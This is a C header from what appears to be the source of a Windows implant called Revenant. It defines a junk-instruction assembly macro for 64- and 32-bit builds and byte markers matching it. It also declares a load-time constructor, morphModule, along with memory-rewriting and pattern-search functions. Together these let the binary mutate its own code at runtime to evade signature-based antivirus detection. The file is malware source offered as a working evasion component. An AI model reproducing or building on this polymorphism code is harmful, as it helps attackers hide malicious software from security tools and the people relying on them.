#ifndef REVENANT_POLY_H
#define REVENANT_POLY_H

#include "Config.h"

#define RAND ((((__TIME__[7] - '0') * 1 + (__TIME__[6] - '0') * 10 \
                   + (__TIME__[4] - '0') * 60 + (__TIME__[3] - '0') * 600 \
                   + (__TIME__[1] - '0') * 3600 + (__TIME__[0] - '0') * 36000) & 0xFF))

#if (CONFIG_POLYMORPHIC == TRUE) && (CONFIG_ARCH == 64)
#include <windows.h>
#include <tchar.h>
#include <psapi.h>
#include <time.h>

#include "Strings.h"
#include "Obfuscation.h"
#include "Utilities.h"
#include "Asm.h"
#include "Defs.h"
#include "Config.h"

// Some Functionality based on C++ code from GuidedHacking

/// $$$ is the polymorphism macro
#define $$$ __asm (\
    ".intel_syntax noprefix;"   \
    "pushfq;"                   \
    "push rcx;"                 \
    "push rdx;"                 \
    "push r8;"                  \
    "push r9;"                  \
    "xchg rax, rax;"            \
    "xchg rax, rax;"            \
    "xchg rbx, rbx;"            \
    "xchg rbx, rbx;"            \
    "xchg rax, rax;"            \
    "xchg rax, rax;"            \
    "pop r9;"                   \
    "pop r8;"                   \
    "pop rdx;"                  \
    "pop rcx;"                  \
    "popfq;");


// A sequence of bytes to search for in memory
#define MARKER_BYTES "\x9C\x51\x52\x41\x50\x41\x51\x90\x90\x48\x87\xDB\x48\x87\xDB\x90\x90\x41\x59\x41\x58\x5A\x59\x9D"
// The length of the marker in bytes
#define MARKER_SIZE 24
// S_MARKER_MASK is a string of characters representing which bytes in the marker to search for ("x" means search, any other character means ignore)


// assembler opcode defines for inline asm
#define ASM_OPCODE_JMP_REL        0xEB
#define ASM_OPCODE_NOP            0x90

// size of the full assembler instruction in bytes
#define ASM_INSTR_SIZE_JMP_REL    0x2
#define ASM_INSTR_SIZE_NOP        0x1


#if CONFIG_MAKE == 0
INT __attribute__((constructor)) morphModule();
#elif CONFIG_MAKE == 1
INT morphModule(HINSTANCE hinstDLL);
#endif


VOID morphMemory(UCHAR* pbyDst, UCHAR byLength);
VOID* findPattern(VOID* startAddress, SIZE_T searchSize, CONST VOID* pattern, CONST VOID* mask, SIZE_T patternSize);

#elif (CONFIG_POLYMORPHIC == TRUE) && (CONFIG_ARCH == 86)
#include <windows.h>
#include <tchar.h>
#include <psapi.h>
#include <time.h>

#include "Strings.h"
#include "Obfuscation.h"
#include "Utilities.h"
#include "Asm.h"
#include "Defs.h"


#define RAND ((((__TIME__[7] - '0') * 1 + (__TIME__[6] - '0') * 10 \
                   + (__TIME__[4] - '0') * 60 + (__TIME__[3] - '0') * 600 \
                   + (__TIME__[1] - '0') * 3600 + (__TIME__[0] - '0') * 36000) & 0xFF))

/// $$$ is the polymorphism macro
#define $$$ __asm(\
    ".intel_syntax noprefix;"     \
    "pushfd;"                     \
    "pushad;"                     \
    "xchg ecx, eax;"              \
    "xchg ecx, eax;"              \
    "xchg ebx, eax;"              \
    "xchg ebx, eax;"              \
    "inc eax;"                    \
    "dec eax;"                    \
    "inc ebx;"                    \
    "dec ebx;"                    \
    "inc ecx;"                    \
    "dec ecx;"                    \
    "xchg ecx, ecx;"              \
    "xchg eax, eax;"              \
    "xchg ebx, ebx;"              \
    "xchg eax, eax;"              \
    "popad;"                      \
    "popfd;"                      \
    );


// A sequence of bytes to search for in memory
#define MARKER_BYTES "\x9C\x60\x91\x91\x93\x93\x40\x48\x43\x4B\x41\x49\x87\xC9\x90\x87\xDB\x90\x61\x9D"

// The length of the marker in bytes
#define MARKER_SIZE 20

// S_MARKER_MASK is a string of characters representing which bytes in the marker to search for ("x" means search, any other character means ignore)

// assembler opcode defines for inline asm
#define ASM_OPCODE_JMP_REL        0xEB
#define ASM_OPCODE_NOP            0x90

// size of the full assembler instruction in bytes
#define ASM_INSTR_SIZE_JMP_REL    0x2
#define ASM_INSTR_SIZE_NOP        0x1

#if CONFIG_MAKE == 0
INT __attribute__((constructor)) morphModule();
#elif CONFIG_MAKE == 1
INT morphModule(HINSTANCE hinstDLL);
#endif
VOID morphMemory(UCHAR* pbyDst, UCHAR byLength);
VOID* findPattern(VOID* startAddress, SIZE_T searchSize, CONST VOID* pattern, CONST VOID* mask, SIZE_T patternSize);

#else
#define $$$ __asm__ ("nop;");

#endif //POLY

#endif //REVENANT_POLY_H
